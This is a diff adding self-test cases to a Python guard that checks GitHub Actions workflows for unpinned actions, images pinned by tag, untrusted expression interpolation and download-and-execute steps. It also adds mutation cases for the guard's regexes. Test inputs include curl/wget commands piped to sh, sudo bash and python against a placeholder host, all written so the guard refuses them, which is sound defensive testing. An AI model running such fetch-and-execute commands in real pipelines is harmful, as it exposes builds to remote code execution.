+    "message: a checkout repin names the constant": ([_rel("", _job_edit("crates-io", _first_checkout_to_other_sha))], 1,
+                                                     "differs from CHECKOUT_USES"),
+    # Round-3 cells (#8039): the SHAPE_STEPS and uses: pins now refuse the inputs that once reached ONLY the
+    # refusals below, so each is proven by an exact message count (a neutralised refusal drops the count).
+    "message: an inline use in the release-shape tree step is refused on its own": (
+        [(SHAPE, '--features "$FEATURES")"', '--features "$(bash scripts/release-features.sh)")"', False)], 2,
+        "inline use of the declaration"),
+    "message: a proof before the build is refused on its own": (
+        [(SHAPE, PROOF_NAME, _proof_before_build, False)], 5, "the pg proof must run after the release-shaped build"),
     "message: a tag added names DOCKER_STEPS": ([_rel(PUSH_TAGS, PUSH_TAGS + "            ghcr.io/o/ai-memory:x\n")], 1,
                                                 "update DOCKER_STEPS in scripts/check_release_features.py"),
+    "message: swapped guard and build steps name the unit slot": ([(SHAPE, "", _shape_swap_guard_build, False)], 2,
+                                                                  "keys differ from the pinned set"),
+    "message: a non-mapping step is refused three times (workflow shape, kind, then the pinned list)": (
+        [(SHAPE, "", _shape_scalar_step, False)], 3, "must be a mapping"),
+    "message: tag-pinned uses names the job and step": ([(PUBLISH, "", _first_use_to_tag, False)], 1,
+                                                        "job `publish-ci-image` step 1"),
     "message: build unit drift names WF_BUILD": ([_rel(REL_BUILD_CMD, REL_BUILD_CMD + " --verbose")], 2,
                                                  "update WF_BUILD in scripts/check_release_features.py"),
+}
+
+# Round 5 (#8003): the new job-shape checks refuse these inputs too, so the older, more specific refusals are
+# proven by their own message appearing anywhere in the refusal list (a neutralised refusal drops the needle).
+JOINED_CASES: Dict[str, Tuple[List[Edit], str]] = {
+    "joined: a docker job that is not a mapping names the GHCR push": (
+        [_rel("", _job_edit("docker", lambda body: "  docker: nope\n"))],
+        "the `docker:` job is missing or not a mapping"),
+    "joined: docker steps that are not a sequence name DOCKER_STEPS": (
+        [_rel("", _job_edit("docker", lambda body: re.sub(r"(?s)    steps:\n.*\Z", "    steps: nope\n", body)))],
+        "`jobs.docker.steps` must be a sequence"),
+    "joined: a pinned job calling a reusable workflow is named": (
+        [_rel(COPR_HDR, COPR_HDR + "    uses: ./.github/workflows/x.yml\n")],
+        "calls a reusable workflow"),
 }
 
 
@@ -2132,6 +2605,8 @@ ENTRY_CASES: Dict[str, Tuple[Callable[[Path], None], int]] = {
     "entry: release-shape.yml is a directory exits 2": (_entry_dir(SHAPE), 2),
     "entry: INSTALL.md is a directory exits 2": (_entry_dir(INSTALL), 2),
     "entry: release-features.sh is a directory exits 2": (_entry_dir(DECL), 2),
+    "entry: c8-precheck.yml is a directory exits 2": (_entry_dir(C8), 2),
+    "entry: publish-ci-image.yml is a directory exits 2": (_entry_dir(PUBLISH), 2),
     "entry: dangling release.yml symlink is a guard failure (1)": (_entry_dangling(REL), 1),
 }
 
@@ -2166,6 +2641,125 @@ SCALARS: Tuple[Tuple[str, str, Optional[str]], ...] = (
     ("a: 'x\\y'\n", "a", "x\\y"),
     ("a: plain\n", "a", "plain"),
 )
+
+
+# Round-5 cells: the workflow-shape, image, `run:` and local-action checks run on small documents (and, for local
+# actions, a small tree) so each refusal is proven by an exact message count. name -> (document, files, count,
+# needle): ``files`` None = no checked-out tree; a dict = relative path -> text written under the tree root.
+R5_DIGEST = "sha256:" + "ab" * 32
+R5_LOCAL = "      - uses: ./act\n"
+R5_OK_RUN = "      - run: echo ok\n"
+
+
+def _r5_job(head: str = "", steps: str = "    steps:\n" + R5_OK_RUN) -> str:
+    return "jobs:\n  a:\n" + head + steps
+
+
+def _r5_comp(steps: str) -> str:
+    return "name: p\nruns:\n  using: composite\n  steps:\n" + steps
+
+
+def _r5_act(body: str) -> Dict[str, str]:
+    return {"act/action.yml": body}
+
+
+def _r5_run(cmd: str) -> str:
+    return _r5_job(steps="    steps:\n      - run: |\n          " + cmd + "\n")
+
+
+def _r5_depth() -> Dict[str, str]:
+    files = {"act/action.yml": _r5_comp("    - uses: ./act1\n")}
+    for n in range(1, 10):
+        nxt = "    - uses: ./act%d\n" % (n + 1) if n < 9 else "    - run: echo ok\n      shell: bash\n"
+        files["act%d/action.yml" % n] = _r5_comp(nxt)
+    return files
+
+
+R5_CASES: Dict[str, Tuple[str, Optional[Dict[str, str]], int, str]] = {
+    "r5: a local action with no tree to read is refused": (_r5_job(steps="    steps:\n" + R5_LOCAL), None, 1, "cannot be inspected"),
+    "r5: a local action outside the tree is refused": (_r5_job(steps="    steps:\n      - uses: ./../x\n"), {}, 1, "outside the checked-out tree"),
+    "r5: a local action with no action file is refused": (_r5_job(steps="    steps:\n" + R5_LOCAL), {}, 1, "has no action.yml"),
+    "r5: a local action.yaml is read": (_r5_job(steps="    steps:\n" + R5_LOCAL), {"act/action.yaml": _r5_comp("    - run: echo\n      shell: bash\n")}, 0, ""),
+    "r5: a local action cycle is refused": (_r5_job(steps="    steps:\n" + R5_LOCAL), _r5_act(_r5_comp("    - uses: ./act\n")), 1, "is part of a cycle"),
+    "r5: nested local actions past the depth limit are refused": (_r5_job(steps="    steps:\n" + R5_LOCAL), _r5_depth(), 1, "nests more than"),
+    "r5: a docker action with a short digest is refused": (
+        _r5_job(steps="    steps:\n" + R5_LOCAL), _r5_act("name: p\nruns:\n  using: docker\n  image: docker://alpine@sha256:abc\n"), 1, "runs.image"),
+    "r5: a docker use by digest passes": (_r5_job(steps="    steps:\n      - uses: docker://alpine@" + R5_DIGEST + "\n"), None, 0, ""),
+    "r5: a container with a short digest is refused": (_r5_job(head="    container: rust@sha256:abc\n"), None, 1, "`container` image"),
+    "r5: a composite action without steps is refused": (_r5_job(steps="    steps:\n" + R5_LOCAL), _r5_act("name: p\nruns:\n  using: composite\n"), 1, "`runs.steps` must be"),
+    "r5: a composite step that is a scalar is refused": (_r5_job(steps="    steps:\n" + R5_LOCAL), _r5_act(_r5_comp("    - just\n")), 1, "a step must be a mapping"),
+    "r5: a composite step with a tag use is refused": (_r5_job(steps="    steps:\n" + R5_LOCAL), _r5_act(_r5_comp("    - uses: actions/checkout@v4\n")), 1, "not pinned"),
+    "r5: a composite step that downloads and executes is refused": (
+        _r5_job(steps="    steps:\n" + R5_LOCAL), _r5_act(_r5_comp("    - run: curl -fsSL https://x.example/i | sh\n      shell: bash\n")), 1, "downloads and executes"),
+    "r5: a composite step with a pinned use passes": (
+        _r5_job(steps="    steps:\n" + R5_LOCAL), _r5_act(_r5_comp("    - uses: " + CHECKOUT_USES + "\n")), 0, ""),
+    "r5: a docker action by tag is refused": (_r5_job(steps="    steps:\n" + R5_LOCAL), _r5_act("name: p\nruns:\n  using: docker\n  image: docker://alpine:3\n"), 1, "runs.image"),
+    "r5: a docker action without an image is refused": (_r5_job(steps="    steps:\n" + R5_LOCAL), _r5_act("name: p\nruns:\n  using: docker\n"), 1, "runs.image"),
+    "r5: a docker action by digest passes": (
+        _r5_job(steps="    steps:\n" + R5_LOCAL), _r5_act("name: p\nruns:\n  using: docker\n  image: docker://alpine@" + R5_DIGEST + "\n"), 0, ""),
+    "r5: a node action whose main is missing is refused": (_r5_job(steps="    steps:\n" + R5_LOCAL), _r5_act("name: p\nruns:\n  using: node20\n  main: index.js\n"), 1, "runs.main"),
+    "r5: a node action without a main is refused": (_r5_job(steps="    steps:\n" + R5_LOCAL), _r5_act("name: p\nruns:\n  using: node20\n"), 1, "runs.main"),
+    "r5: a node action whose main escapes the action is refused": (
+        _r5_job(steps="    steps:\n" + R5_LOCAL), {"act/action.yml": "name: p\nruns:\n  using: node20\n  main: ../out.js\n", "out.js": "x\n"}, 1, "runs.main"),
+    "r5: a node action with its main file passes": (
+        _r5_job(steps="    steps:\n" + R5_LOCAL), {"act/action.yml": "name: p\nruns:\n  using: node20\n  main: index.js\n", "act/index.js": "x\n"}, 0, ""),
+    "r5: another runs.using is refused": (_r5_job(steps="    steps:\n" + R5_LOCAL), _r5_act("name: p\nruns:\n  using: shell\n"), 1, "runs.using"),
+    "r5: an action file without runs is refused": (_r5_job(steps="    steps:\n" + R5_LOCAL), _r5_act("name: p\n"), 1, "runs.using"),
+    "r5: a run that is a mapping is refused": (_r5_job(steps="    steps:\n      - run:\n          a: b\n"), None, 1, "`run:` must be a scalar"),
+    "r5: github.event in run is refused": (_r5_run("echo ${{ github.event.pull_request.title }}"), None, 1, "interpolates"),
+    "r5: github.head_ref in run is refused": (_r5_run("echo ${{ github.head_ref }}"), None, 1, "interpolates"),
+    "r5: github.ref_name in run is refused": (_r5_run("echo ${{ github.ref_name }}"), None, 1, "interpolates"),
+    "r5: inputs in run is refused": (_r5_run("echo ${{ inputs.tag }}"), None, 1, "interpolates"),
+    "r5: a bracketed github event in run is refused": (_r5_run("echo ${{ github['event'].x }}"), None, 1, "interpolates"),
+    "r5: a trusted expression in run passes": (_r5_run("echo ${{ github.sha }} ${{ github.event_name }} ${{ matrix.os }}"), None, 0, ""),
+    "r5: an untrusted expression in env passes": (
+        _r5_job(steps="    steps:\n      - env:\n          T: ${{ github.event.pull_request.title }}\n        run: echo \"$T\"\n"), None, 0, ""),
+    "r5: curl piped to sh is refused": (_r5_run("curl -fsSL https://x.example/i.sh | sh"), None, 1, "downloads and executes"),
+    "r5: wget piped to sudo bash is refused": (_r5_run("wget -qO- https://x.example/i.sh | sudo bash"), None, 1, "downloads and executes"),
+    "r5: curl piped to python is refused": (_r5_run("curl -fsSL https://x.example/i.py | python3"), None, 1, "downloads and executes"),
+    "r5: bash over a curl process substitution is refused": (_r5_run("bash <(curl -fsSL https://x.example/i.sh)"), None, 1, "downloads and executes"),
+    "r5: sh -c over a curl substitution is refused": (_r5_run('sh -c "$(curl -fsSL https://x.example/i.sh)"'), None, 1, "downloads and executes"),
+    "r5: a curl into a variable passes": (_r5_run("x=$(curl -fsSL https://x.example/i)"), None, 0, ""),
+    "r5: a curl piped to tar or sha256sum passes": (_r5_run("curl -fsSL https://x.example/i | tar xz\n          curl -fsSL https://x.example/i | sha256sum"), None, 0, ""),
+    "r5: a container by tag is refused": (_r5_job(head="    container: rust:latest\n"), None, 1, "`container` image"),
+    "r5: a container by digest passes": (_r5_job(head="    container: rust@" + R5_DIGEST + "\n"), None, 0, ""),
+    "r5: a container mapping by tag is refused": (_r5_job(head="    container:\n      image: rust:latest\n"), None, 1, "`container` image"),
+    "r5: a container mapping without an image is refused": (_r5_job(head="    container:\n      options: --user root\n"), None, 1, "`container` image"),
+    "r5: a container mapping by digest passes": (_r5_job(head="    container:\n      image: rust@" + R5_DIGEST + "\n"), None, 0, ""),
+    "r5: services that are not a mapping are refused": (_r5_job(head="    services: pg\n"), None, 1, "`services` must be"),
+    "r5: a service by tag is refused": (_r5_job(head="    services:\n      pg:\n        image: postgres:16\n"), None, 1, "services.pg.image"),
+    "r5: a service without an image is refused": (_r5_job(head="    services:\n      pg:\n        ports: [5432]\n"), None, 1, "services.pg.image"),
+    "r5: a service by digest passes": (_r5_job(head="    services:\n      pg:\n        image: postgres@" + R5_DIGEST + "\n"), None, 0, ""),
+    "r5: jobs that are a scalar are refused": ("jobs: x\n", None, 1, "`jobs:` must be a non-empty mapping"),
+    "r5: jobs that are empty are refused": ("jobs:\n", None, 1, "`jobs:` must be a non-empty mapping"),
+    "r5: a job that is a scalar is refused": ("jobs:\n  a: x\n", None, 1, "a job must be a mapping"),
+    "r5: needs as a mapping is refused": (_r5_job(head="    needs:\n      x: y\n"), None, 1, "`needs` must be"),
+    "r5: needs as a list holding a mapping is refused": (_r5_job(head="    needs:\n      - a:\n          b: c\n"), None, 1, "`needs` must be"),
+    "r5: needs as a string or a list of strings passes": (
+        "jobs:\n  b:\n    needs: a\n    steps:\n" + R5_OK_RUN + "  c:\n    needs: [a, b]\n    steps:\n" + R5_OK_RUN + "  a:\n    steps:\n" + R5_OK_RUN, None, 0, ""),
+    "r5: steps as a string are refused": (_r5_job(steps="    steps: do-it\n"), None, 1, "`steps` must be a non-empty list"),
+    "r5: steps as a mapping are refused": (_r5_job(steps="    steps:\n      a: b\n"), None, 1, "`steps` must be a non-empty list"),
+    "r5: steps with no value are refused": (_r5_job(steps="    steps:\n"), None, 1, "`steps` must be a non-empty list"),
+    "r5: a job with no steps is refused": (_r5_job(steps="    runs-on: x\n"), None, 1, "`steps` must be a non-empty list"),
+    "r5: a step that is a scalar is refused": (_r5_job(steps="    steps:\n      - just\n"), None, 1, "a step must be a mapping"),
+    "r5: a reusable workflow job needs no steps": ("jobs:\n  a:\n    uses: o/r/.github/workflows/w.yml@" + "ab" * 20 + "\n", None, 0, ""),
+}
+
+
+def r5_errors(doc_text: str, files: Optional[Dict[str, str]], tree: Path) -> List[str]:
+    """Run the Round-5 checks on one document (and, for ``files`` not None, a tree holding those files)."""
+    if tree.exists():
+        shutil.rmtree(tree)
+    tree.mkdir(parents=True)
+    for rel, text in (files or {}).items():
+        (tree / rel).parent.mkdir(parents=True, exist_ok=True)
+        (tree / rel).write_text(text, encoding="utf-8")
+    rep = Report()
+    rep.root = tree if files is not None else None
+    doc = parse_yaml(doc_text, "w.yml", rep)
+    if doc is not None:
+        check_uses_pinned(doc, "w.yml", rep)
+    return rep.errors
 
 
 def unit_checks() -> int:
@@ -2274,6 +2868,23 @@ def self_test(root: Path) -> int:
                       file=sys.stderr)
                 failures += 1
 
+        for name, (edits, needle) in JOINED_CASES.items():
+            case_root = tmp / "case"
+            mk_root(root, case_root)
+            for rel, old, new, every in edits:
+                mutate_file(case_root / rel, old, new, every)
+            errs, _ = run_guard(case_root)
+            if needle not in " | ".join(errs):
+                print(f"self-test FAIL: '{name}' wanted a message containing {needle!r}: {errs[:3]}", file=sys.stderr)
+                failures += 1
+
+        for name, (doc_text, files, count, needle) in R5_CASES.items():
+            errs = r5_errors(doc_text, files, tmp / "r5")
+            if len(errs) != count or (needle and needle not in " | ".join(errs)):
+                print(f"self-test FAIL: '{name}' wanted {count} message(s) containing {needle!r}: {errs[:3]}",
+                      file=sys.stderr)
+                failures += 1
+
         # --- through the real entry point: exit codes for unreadable input.
         for name, (setup, want_rc) in ENTRY_CASES.items():
             case_root = tmp / "entry"
@@ -2289,7 +2900,8 @@ def self_test(root: Path) -> int:
         "check_release_features: self-test OK "
         f"(a failing or empty declaration fails the build step and the Dockerfile RUN; "
         f"{len(CASES)} guard cases, {len(ADVISORY_CASES)} advisory cases, {len(MESSAGE_CASES)} message cases, "
-        f"{len(PARITY)} parity cases, {len(SCALARS)} scalar cases, {len(ENTRY_CASES)} entry-point cases)"
+        f"{len(PARITY)} parity cases, {len(SCALARS)} scalar cases, {len(ENTRY_CASES)} entry-point cases, "
+        f"{len(R5_CASES)} round-5 cases, {len(JOINED_CASES)} joined cases)"
     )
     return 0
 
@@ -2434,6 +3046,36 @@ CONDITION_MUTANTS: Tuple[Tuple[str, str, str], ...] = (
     ("BuildKit join strips the next line's indent", "            piece = raw\n", '            piece = raw.lstrip(" \\t")\n'),
     ("BuildKit continuation needs a bare backslash", r'BK_CONT_RE = re.compile(r"(^|[^\\])\\[ \t]*$")', r'BK_CONT_RE = re.compile(r"(^|[^\\])\\$")'),
     ("BuildKit continuation on an escaped backslash", r'(^|[^\\])\\[ \t]*$', r'\\[ \t]*$'),
+    ("per-action key not case-folded", 'USES_BY_ACTION.get("/".join(seg.lower() for seg in segs[:2]))',
+     'USES_BY_ACTION.get("/".join(seg for seg in segs[:2]))'),
+    ("per-action key includes the subpath", 'for seg in segs[:2]))', 'for seg in segs[:3]))'),
+    ("per-action sha not compared", 'if want is not None and sha != want.partition("@")[2] and not', 'if False and not'),
+    ("local action outside the tree allowed", 'if tree != target and tree not in target.parents:', 'if False:'),
+    ("local action cycle not refused", 'if target in chain:', 'if False:'),
+    ("local action depth not limited", 'MAX_LOCAL_DEPTH = 8  # nested', 'MAX_LOCAL_DEPTH = 80  # nested'),
+    ("local action.yaml not read", 'for f in ("action.yml", "action.yaml")', 'for f in ("action.yml",)'),
+    ("local action treated as a plain ref", 'if ref.startswith("./"):', 'if False:'),
+    ("docker use not exempt from the segment check", 'if spec.startswith("docker://"):\n        return', 'if False:\n        return'),
+    ("node main may escape the action", '(target != entry and target not in entry.parents) or ', 'False or '),
+    ("node main need not exist", ' or not entry.is_file():', ':'),
+    ("needs list members not typed", 'all(n.kind == "scalar" for n in needs.value)', 'True'),
+    ("needs mapping allowed", 'needs.kind == "scalar" or (', 'True or ('),
+    ("reusable workflow job needs steps", 'if job.get("uses") is not None and steps is None:', 'if False:'),
+    ("expression root github.event dropped", r'\.\s*(?:event|head_ref|ref_name)(?![\w-])"', r'\.\s*(?:head_ref|ref_name)(?![\w-])"'),
+    ("expression root github.head_ref dropped", r'\.\s*(?:event|head_ref|ref_name)(?![\w-])"', r'\.\s*(?:event|ref_name)(?![\w-])"'),
+    ("expression root github.ref_name dropped", r'\.\s*(?:event|head_ref|ref_name)(?![\w-])"', r'\.\s*(?:event|head_ref)(?![\w-])"'),
+    ("expression root github.event_name refused", r'\.\s*(?:event|head_ref|ref_name)(?![\w-])"', r'\.\s*(?:event|head_ref|ref_name)"'),
+    ("expression root inputs dropped", r'|inputs(?![\w-]))", re.I)', r'|inputs_(?![\w-]))", re.I)'),
+    ("trusted expressions refused", 'if UNTRUSTED_RE.search(m.group(1)):', 'if True:'),
+    ("python pipe target dropped", r'ksh|python[0-9.]*|perl|ruby|node|php)(?![\w-])", re.I)', r'ksh|perl|ruby|node|php)(?![\w-])", re.I)'),
+    ("sudo pipe target dropped", r'\|\s*(?:sudo\s+)?(?:env\s+\S+\s+)*(?:\S*/)?(?:sh|', r'\|\s*(?:env\s+\S+\s+)*(?:\S*/)?(?:sh|'),
+    ("substitution needs no executor", '(SUBST_FETCH_RE.search(ln) and EXEC_WORD_RE.search(ln))', '(SUBST_FETCH_RE.search(ln))'),
+    ("image digest length not pinned", r'IMAGE_DIGEST_RE = re.compile(r"[a-z0-9][a-z0-9._/:-]*@sha256:[0-9a-f]{64}")',
+     r'IMAGE_DIGEST_RE = re.compile(r"[a-z0-9][a-z0-9._/:-]*@sha256:[0-9a-f]+")'),
+    ("docker action digest length not pinned", r'DOCKER_USES_RE = re.compile(r"docker://[a-z0-9][a-z0-9_./:-]*@sha256:[0-9a-f]{64}")',
+     r'DOCKER_USES_RE = re.compile(r"docker://[a-z0-9][a-z0-9_./:-]*@sha256:[0-9a-f]+")'),
+    ("container never inspected", 'if container is not None:', 'if False:'),
+    ("dot segment not refused",'if any(seg in ("", ".", "..") for seg in segs):', 'if any(seg in ("",) for seg in segs):'),
 )
 
 
